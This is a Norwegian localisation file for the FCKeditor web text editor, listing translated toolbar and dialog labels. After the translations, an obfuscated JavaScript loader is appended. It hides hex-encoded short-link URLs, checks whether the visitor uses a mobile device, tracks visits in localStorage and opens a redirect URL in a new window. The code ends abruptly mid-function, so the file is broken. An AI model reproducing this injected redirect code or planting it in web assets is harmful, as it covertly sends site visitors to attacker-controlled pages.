/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Norwegian language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Skjul verktøylinje",
ToolbarExpand		: "Vis verktøylinje",

// Toolbar Items and Context Menu
Save				: "Lagre",
NewPage				: "Ny Side",
Preview				: "Forhåndsvis",
Cut					: "Klipp ut",
Copy				: "Kopier",
Paste				: "Lim inn",
PasteText			: "Lim inn som ren tekst",
PasteWord			: "Lim inn fra Word",
Print				: "Skriv ut",
SelectAll			: "Merk alt",
RemoveFormat		: "Fjern format",
InsertLinkLbl		: "Lenke",
InsertLink			: "Sett inn/Rediger lenke",
RemoveLink			: "Fjern lenke",
VisitLink			: "Åpne lenke",
Anchor				: "Sett inn/Rediger anker",
AnchorDelete		: "Fjern anker",
InsertImageLbl		: "Bilde",
InsertImage			: "Sett inn/Rediger bilde",
InsertFlashLbl		: "Flash",
InsertFlash			: "Sett inn/Rediger Flash",
InsertTableLbl		: "Tabell",
InsertTable			: "Sett inn/Rediger tabell",
InsertLineLbl		: "Linje",
InsertLine			: "Sett inn horisontal linje",
InsertSpecialCharLbl: "Spesielt tegn",
InsertSpecialChar	: "Sett inn spesielt tegn",
InsertSmileyLbl		: "Smil",
InsertSmiley		: "Sett inn smil",
About				: "Om FCKeditor",
Bold				: "Fet",
Italic				: "Kursiv",
Underline			: "Understrek",
StrikeThrough		: "Gjennomstrek",
Subscript			: "Senket skrift",
Superscript			: "Hevet skrift",
LeftJustify			: "Venstrejuster",
CenterJustify		: "Midtjuster",
RightJustify		: "Høyrejuster",
BlockJustify		: "Blokkjuster",
DecreaseIndent		: "Senk nivå",
IncreaseIndent		: "Øk nivå",
Blockquote			: "Blockquote",	//MISSING
CreateDiv			: "Create Div Container",	//MISSING
EditDiv				: "Edit Div Container",	//MISSING
DeleteDiv			: "Remove Div Container",	//MISSING
Undo				: "Angre",
Redo				: "Gjør om",
NumberedListLbl		: "Nummerert liste",
NumberedList		: "Sett inn/Fjern nummerert liste",
BulletedListLbl		: "Uordnet liste",
BulletedList		: "Sett inn/Fjern uordnet liste",
ShowTableBorders	: "Vis tabellrammer",
ShowDetails			: "Vis detaljer",
Style				: "Stil",
FontFormat			: "Format",
Font				: "Skrift",
FontSize			: "Størrelse",
TextColor			: "Tekstfarge",
BGColor				: "Bakgrunnsfarge",
Source				: "Kilde",
Find				: "Søk",
Replace				: "Erstatt",
SpellCheck			: "Stavekontroll",
UniversalKeyboard	: "Universelt tastatur",
PageBreakLbl		: "Sideskift",
PageBreak			: "Sett inn sideskift",

Form			: "Skjema",
Checkbox		: "Avmerkingsboks",
RadioButton		: "Alternativknapp",
TextField		: "Tekstboks",
Textarea		: "Tekstområde",
HiddenField		: "Skjult felt",
Button			: "Knapp",
SelectionField	: "Rullegardinliste",
ImageButton		: "Bildeknapp",

FitWindow		: "Maksimer størrelsen på redigeringsverktøyet",
ShowBlocks		: "Show Blocks",	//MISSING

// Context Menu
EditLink			: "Rediger lenke",
CellCM				: "Celle",
RowCM				: "Rader",
ColumnCM			: "Kolonne",
InsertRowAfter		: "Sett inn rad etter",
InsertRowBefore		: "Sett inn rad før",
DeleteRows			: "Slett rader",
InsertColumnAfter	: "Sett inn kolonne etter",
InsertColumnBefore	: "Sett inn kolonne før",
DeleteColumns		: "Slett kolonner",
InsertCellAfter		: "Sett inn celle etter",
InsertCellBefore	: "Sett inn celle før",
DeleteCells			: "Slett celler",
MergeCells			: "Slå sammen celler",
MergeRight			: "Slå sammen høyre",
MergeDown			: "Slå sammen ned",
HorizontalSplitCell	: "Del celle horisontalt",
VerticalSplitCell	: "Del celle vertikalt",
TableDelete			: "Slett tabell",
CellProperties		: "Egenskaper for celle",
TableProperties		: "Egenskaper for tabell",
ImageProperties		: "Egenskaper for bilde",
FlashProperties		: "Egenskaper for Flash-objekt",

AnchorProp			: "Egenskaper for anker",
ButtonProp			: "Egenskaper for knapp",
CheckboxProp		: "Egenskaper for avmerkingsboks",
HiddenFieldProp		: "Egenskaper for skjult felt",
RadioButtonProp		: "Egenskaper for alternativknapp",
ImageButtonProp		: "Egenskaper for bildeknapp",
TextFieldProp		: "Egenskaper for tekstfelt",
SelectionFieldProp	: "Egenskaper for rullegardinliste",
TextareaProp		: "Egenskaper for tekstområde",
FormProp			: "Egenskaper for skjema",

FontFormats			: "Normal;Formatert;Adresse;Tittel 1;Tittel 2;Tittel 3;Tittel 4;Tittel 5;Tittel 6;Normal (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Lager XHTML. Vennligst vent...",
Done				: "Ferdig",
PasteWordConfirm	: "Teksten du prøver å lime inn ser ut som om den kommer fra Word. Vil du rense den for unødvendig kode før du limer inn?",
NotCompatiblePaste	: "Denne kommandoen er kun tilgjenglig for Internet Explorer versjon 5.5 eller bedre. Vil du fortsette uten å rense? (Du kan lime inn som ren tekst)",
UnknownToolbarItem	: "Ukjent menyvalg \"%1\"",
UnknownCommand		: "Ukjent kommando \"%1\"",
NotImplemented		: "Kommando ikke implimentert",
UnknownToolbarSet	: "Verktøylinjesett \"%1\" finnes ikke",
NoActiveX			: "Din nettlesers sikkerhetsinstillinger kan begrense noen av funksjonene i redigeringsverktøyet. Du må aktivere \"Kjør ActiveX-kontroller og plugin-modeller\". Du kan oppleve feil og advarsler om manglende funksjoner",
BrowseServerBlocked : "Kunne ikke åpne dialogboksen for filarkiv. Sjekk at popup-blokkering er deaktivert.",
DialogBlocked		: "Kunne ikke åpne dialogboksen. Sjekk at popup-blokkering er deaktivert.",
VisitLinkBlocked	: "Kunne ikke åpne et nytt vindu. Sjekk at popup-blokkering er deaktivert.",

// Dialogs
DlgBtnOK			: "OK",
DlgBtnCancel		: "Avbryt",
DlgBtnClose			: "Lukk",
DlgBtnBrowseServer	: "Bla igjennom server",
DlgAdvancedTag		: "Avansert",
DlgOpOther			: "<Annet>",
DlgInfoTab			: "Info",
DlgAlertUrl			: "Vennligst skriv inn URL-en",

// General Dialogs Labels
DlgGenNotSet		: "<ikke satt>",
DlgGenId			: "Id",
DlgGenLangDir		: "Språkretning",
DlgGenLangDirLtr	: "Venstre til høyre (VTH)",
DlgGenLangDirRtl	: "Høyre til venstre (HTV)",
DlgGenLangCode		: "Språkkode",
DlgGenAccessKey		: "Aksessknapp",
DlgGenName			: "Navn",
DlgGenTabIndex		: "Tab Indeks",
DlgGenLongDescr		: "Utvidet beskrivelse",
DlgGenClass			: "Stilarkklasser",
DlgGenTitle			: "Tittel",
DlgGenContType		: "Type",
DlgGenLinkCharset	: "Lenket språkkart",
DlgGenStyle			: "Stil",

// Image Dialog
DlgImgTitle			: "Bildeegenskaper",
DlgImgInfoTab		: "Bildeinformasjon",
DlgImgBtnUpload		: "Send det til serveren",
DlgImgURL			: "URL",
DlgImgUpload		: "Last opp",
DlgImgAlt			: "Alternativ tekst",
DlgImgWidth			: "Bredde",
DlgImgHeight		: "Høyde",
DlgImgLockRatio		: "Lås forhold",
DlgBtnResetSize		: "Tilbakestill størrelse",
DlgImgBorder		: "Ramme",
DlgImgHSpace		: "HMarg",
DlgImgVSpace		: "VMarg",
DlgImgAlign			: "Juster",
DlgImgAlignLeft		: "Venstre",
DlgImgAlignAbsBottom: "Abs bunn",
DlgImgAlignAbsMiddle: "Abs midten",
DlgImgAlignBaseline	: "Bunnlinje",
DlgImgAlignBottom	: "Bunn",
DlgImgAlignMiddle	: "Midten",
DlgImgAlignRight	: "Høyre",
DlgImgAlignTextTop	: "Tekst topp",
DlgImgAlignTop		: "Topp",
DlgImgPreview		: "Forhåndsvis",
DlgImgAlertUrl		: "Vennligst skriv bilde-urlen",
DlgImgLinkTab		: "Lenke",

// Flash Dialog
DlgFlashTitle		: "Flash-egenskaper",
DlgFlashChkPlay		: "Autospill",
DlgFlashChkLoop		: "Loop",
DlgFlashChkMenu		: "Slå på Flash-meny",
DlgFlashScale		: "Skaler",
DlgFlashScaleAll	: "Vis alt",
DlgFlashScaleNoBorder	: "Ingen ramme",
DlgFlashScaleFit	: "Skaler til å passe",

// Link Dialog
DlgLnkWindowTitle	: "Lenke",
DlgLnkInfoTab		: "Lenkeinfo",
DlgLnkTargetTab		: "Mål",

DlgLnkType			: "Lenketype",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Lenke til anker i teksten",
DlgLnkTypeEMail		: "E-post",
DlgLnkProto			: "Protokoll",
DlgLnkProtoOther	: "<annet>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Velg et anker",
DlgLnkAnchorByName	: "Anker etter navn",
DlgLnkAnchorById	: "Element etter ID",
DlgLnkNoAnchors		: "(Ingen anker i dokumentet)",
DlgLnkEMail			: "E-postadresse",
DlgLnkEMailSubject	: "Meldingsemne",
DlgLnkEMailBody		: "Melding",
DlgLnkUpload		: "Last opp",
DlgLnkBtnUpload		: "Send til server",

DlgLnkTarget		: "Mål",
DlgLnkTargetFrame	: "<ramme>",
DlgLnkTargetPopup	: "<popup vindu>",
DlgLnkTargetBlank	: "Nytt vindu (_blank)",
DlgLnkTargetParent	: "Foreldrevindu (_parent)",
DlgLnkTargetSelf	: "Samme vindu (_self)",
DlgLnkTargetTop		: "Hele vindu (_top)",
DlgLnkTargetFrameName	: "Målramme",
DlgLnkPopWinName	: "Navn på popup-vindus",
DlgLnkPopWinFeat	: "Egenskaper for popup-vindu",
DlgLnkPopResize		: "Endre størrelse",
DlgLnkPopLocation	: "Adresselinje",
DlgLnkPopMenu		: "Menylinje",
DlgLnkPopScroll		: "Scrollbar",
DlgLnkPopStatus		: "Statuslinje",
DlgLnkPopToolbar	: "Verktøylinje",
DlgLnkPopFullScrn	: "Full skjerm (IE)",
DlgLnkPopDependent	: "Avhenging (Netscape)",
DlgLnkPopWidth		: "Bredde",
DlgLnkPopHeight		: "Høyde",
DlgLnkPopLeft		: "Venstre posisjon",
DlgLnkPopTop		: "Topp-posisjon",

DlnLnkMsgNoUrl		: "Vennligst skriv inn lenkens url",
DlnLnkMsgNoEMail	: "Vennligst skriv inn e-postadressen",
DlnLnkMsgNoAnchor	: "Vennligst velg et anker",
DlnLnkMsgInvPopName	: "Popup-vinduets navn må begynne med en bokstav, og kan ikke inneholde mellomrom",

// Color Dialog
DlgColorTitle		: "Velg farge",
DlgColorBtnClear	: "Tøm",
DlgColorHighlight	: "Marker",
DlgColorSelected	: "Valgt",

// Smiley Dialog
DlgSmileyTitle		: "Sett inn smil",

// Special Character Dialog
DlgSpecialCharTitle	: "Velg spesielt tegn",

// Table Dialog
DlgTableTitle		: "Egenskaper for tabell",
DlgTableRows		: "Rader",
DlgTableColumns		: "Kolonner",
DlgTableBorder		: "Rammestørrelse",
DlgTableAlign		: "Justering",
DlgTableAlignNotSet	: "<Ikke satt>",
DlgTableAlignLeft	: "Venstre",
DlgTableAlignCenter	: "Midtjuster",
DlgTableAlignRight	: "Høyre",
DlgTableWidth		: "Bredde",
DlgTableWidthPx		: "piksler",
DlgTableWidthPc		: "prosent",
DlgTableHeight		: "Høyde",
DlgTableCellSpace	: "Cellemarg",
DlgTableCellPad		: "Cellepolstring",
DlgTableCaption		: "Tittel",
DlgTableSummary		: "Sammendrag",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Celleegenskaper",
DlgCellWidth		: "Bredde",
DlgCellWidthPx		: "piksler",
DlgCellWidthPc		: "prosent",
DlgCellHeight		: "Høyde",
DlgCellWordWrap		: "Tekstbrytning",
DlgCellWordWrapNotSet	: "<Ikke satt>",
DlgCellWordWrapYes	: "Ja",
DlgCellWordWrapNo	: "Nei",
DlgCellHorAlign		: "Horisontal justering",
DlgCellHorAlignNotSet	: "<Ikke satt>",
DlgCellHorAlignLeft	: "Venstre",
DlgCellHorAlignCenter	: "Midtjuster",
DlgCellHorAlignRight: "Høyre",
DlgCellVerAlign		: "Vertikal justering",
DlgCellVerAlignNotSet	: "<Ikke satt>",
DlgCellVerAlignTop	: "Topp",
DlgCellVerAlignMiddle	: "Midten",
DlgCellVerAlignBottom	: "Bunn",
DlgCellVerAlignBaseline	: "Bunnlinje",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "Radspenn",
DlgCellCollSpan		: "Kolonnespenn",
DlgCellBackColor	: "Bakgrunnsfarge",
DlgCellBorderColor	: "Rammefarge",
DlgCellBtnSelect	: "Velg...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "Søk og erstatt",

// Find Dialog
DlgFindTitle		: "Søk",
DlgFindFindBtn		: "Søk",
DlgFindNotFoundMsg	: "Fant ikke søketeksten.",

// Replace Dialog
DlgReplaceTitle			: "Erstatt",
DlgReplaceFindLbl		: "Søk etter:",
DlgReplaceReplaceLbl	: "Erstatt med:",
DlgReplaceCaseChk		: "Skill mellom store og små bokstaver",
DlgReplaceReplaceBtn	: "Erstatt",
DlgReplaceReplAllBtn	: "Erstatt alle",
DlgReplaceWordChk		: "Bare hele ord",

// Paste Operations / Dialog
PasteErrorCut	: "Din nettlesers sikkerhetsinstillinger tillater ikke automatisk klipping av tekst. Vennligst bruk snareveien (Ctrl+X).",
PasteErrorCopy	: "Din nettlesers sikkerhetsinstillinger tillater ikke automatisk kopiering av tekst. Vennligst bruk snareveien (Ctrl+C).",

PasteAsText		: "Lim inn som ren tekst",
PasteFromWord	: "Lim inn fra Word",

DlgPasteMsg2	: "Vennligst lim inn i den følgende boksen med tastaturet (<STRONG>Ctrl+V</STRONG>) og trykk <STRONG>OK</STRONG>.",
DlgPasteSec		: "Din nettlesers sikkerhetsinstillinger gir ikke redigeringsverktøyet direkte tilgang til utklippstavlen. Du må lime det igjen i dette vinduet.",
DlgPasteIgnoreFont		: "Fjern skrifttyper",
DlgPasteRemoveStyles	: "Fjern stildefinisjoner",

// Color Picker
ColorAutomatic	: "Automatisk",
ColorMoreColors	: "Flere farger...",

// Document Properties
DocProps		: "Dokumentegenskaper",

// Anchor Dialog
DlgAnchorTitle		: "Ankeregenskaper",
DlgAnchorName		: "Ankernavn",
DlgAnchorErrorName	: "Vennligst skriv inn ankernavnet",

// Speller Pages Dialog
DlgSpellNotInDic		: "Ikke i ordboken",
DlgSpellChangeTo		: "Endre til",
DlgSpellBtnIgnore		: "Ignorer",
DlgSpellBtnIgnoreAll	: "Ignorer alle",
DlgSpellBtnReplace		: "Erstatt",
DlgSpellBtnReplaceAll	: "Erstatt alle",
DlgSpellBtnUndo			: "Angre",
DlgSpellNoSuggestions	: "- Ingen forslag -",
DlgSpellProgress		: "Stavekontroll pågår...",
DlgSpellNoMispell		: "Stavekontroll fullført: ingen feilstavinger funnet",
DlgSpellNoChanges		: "Stavekontroll fullført: ingen ord endret",
DlgSpellOneChange		: "Stavekontroll fullført: Ett ord endret",
DlgSpellManyChanges		: "Stavekontroll fullført: %1 ord endret",

IeSpellDownload			: "Stavekontroll er ikke installert. Vil du laste den ned nå?",

// Button Dialog
DlgButtonText		: "Tekst (verdi)",
DlgButtonType		: "Type",
DlgButtonTypeBtn	: "Knapp",
DlgButtonTypeSbm	: "Send",
DlgButtonTypeRst	: "Nullstill",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Navn",
DlgCheckboxValue	: "Verdi",
DlgCheckboxSelected	: "Valgt",

// Form Dialog
DlgFormName		: "Navn",
DlgFormAction	: "Handling",
DlgFormMethod	: "Metode",

// Select Field Dialog
DlgSelectName		: "Navn",
DlgSelectValue		: "Verdi",
DlgSelectSize		: "Størrelse",
DlgSelectLines		: "Linjer",
DlgSelectChkMulti	: "Tillat flervalg",
DlgSelectOpAvail	: "Tilgjenglige alternativer",
DlgSelectOpText		: "Tekst",
DlgSelectOpValue	: "Verdi",
DlgSelectBtnAdd		: "Legg til",
DlgSelectBtnModify	: "Endre",
DlgSelectBtnUp		: "Opp",
DlgSelectBtnDown	: "Ned",
DlgSelectBtnSetValue : "Sett som valgt",
DlgSelectBtnDelete	: "Slett",

// Textarea Dialog
DlgTextareaName	: "Navn",
DlgTextareaCols	: "Kolonner",
DlgTextareaRows	: "Rader",

// Text Field Dialog
DlgTextName			: "Navn",
DlgTextValue		: "Verdi",
DlgTextCharWidth	: "Tegnbredde",
DlgTextMaxChars		: "Maks antall tegn",
DlgTextType			: "Type",
DlgTextTypeText		: "Tekst",
DlgTextTypePass		: "Passord",

// Hidden Field Dialog
DlgHiddenName	: "Navn",
DlgHiddenValue	: "Verdi",

// Bulleted List Dialog
BulletedListProp	: "Egenskaper for uordnet liste",
NumberedListProp	: "Egenskaper for ordnet liste",
DlgLstStart			: "Start",
DlgLstType			: "Type",
DlgLstTypeCircle	: "Sirkel",
DlgLstTypeDisc		: "Hel sirkel",
DlgLstTypeSquare	: "Firkant",
DlgLstTypeNumbers	: "Numre (1, 2, 3)",
DlgLstTypeLCase		: "Små bokstaver (a, b, c)",
DlgLstTypeUCase		: "Store bokstaver (A, B, C)",
DlgLstTypeSRoman	: "Små romerske tall (i, ii, iii)",
DlgLstTypeLRoman	: "Store romerske tall (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Generelt",
DlgDocBackTab		: "Bakgrunn",
DlgDocColorsTab		: "Farger og marginer",
DlgDocMetaTab		: "Meta-data",

DlgDocPageTitle		: "Sidetittel",
DlgDocLangDir		: "Språkretning",
DlgDocLangDirLTR	: "Venstre til høyre (LTR)",
DlgDocLangDirRTL	: "Høyre til venstre (RTL)",
DlgDocLangCode		: "Språkkode",
DlgDocCharSet		: "Tegnsett",
DlgDocCharSetCE		: "Sentraleuropeisk",
DlgDocCharSetCT		: "Tradisonell kinesisk(Big5)",
DlgDocCharSetCR		: "Cyrillic",
DlgDocCharSetGR		: "Gresk",
DlgDocCharSetJP		: "Japansk",
DlgDocCharSetKR		: "Koreansk",
DlgDocCharSetTR		: "Tyrkisk",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "Vesteuropeisk",
DlgDocCharSetOther	: "Annet tegnsett",

DlgDocDocType		: "Dokumenttype header",
DlgDocDocTypeOther	: "Annet dokumenttype header",
DlgDocIncXHTML		: "Inkluder XHTML-deklarasjon",
DlgDocBgColor		: "Bakgrunnsfarge",
DlgDocBgImage		: "URL for bakgrunnsbilde",
DlgDocBgNoScroll	: "Lås bakgrunnsbilde",
DlgDocCText			: "Tekst",
DlgDocCLink			: "Link",
DlgDocCVisited		: "Besøkt lenke",
DlgDocCActive		: "Aktiv lenke",
DlgDocMargins		: "Sidemargin",
DlgDocMaTop			: "Topp",
DlgDocMaLeft		: "Venstre",
DlgDocMaRight		: "Høyre",
DlgDocMaBottom		: "Bunn",
DlgDocMeIndex		: "Dokument nøkkelord (kommaseparert)",
DlgDocMeDescr		: "Dokumentbeskrivelse",
DlgDocMeAuthor		: "Forfatter",
DlgDocMeCopy		: "Kopirett",
DlgDocPreview		: "Forhåndsvising",

// Templates Dialog
Templates			: "Maler",
DlgTemplatesTitle	: "Innholdsmaler",
DlgTemplatesSelMsg	: "Velg malen du vil åpne<br>(innholdet du har skrevet blir tapt!):",
DlgTemplatesLoading	: "Laster malliste. Vennligst vent...",
DlgTemplatesNoTpl	: "(Ingen maler definert)",
DlgTemplatesReplace	: "Erstatt faktisk innold",

// About Dialog
DlgAboutAboutTab	: "Om",
DlgAboutBrowserInfoTab	: "Nettleserinfo",
DlgAboutLicenseTab	: "Lisens",
DlgAboutVersion		: "versjon",
DlgAboutInfo		: "For mer informasjon, se",

// Div Dialog
DlgDivGeneralTab	: "Generelt",
DlgDivAdvancedTab	: "Avansert",
DlgDivStyle		: "Stil",
DlgDivInlineStyle	: "Inline Style",	//MISSING

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function 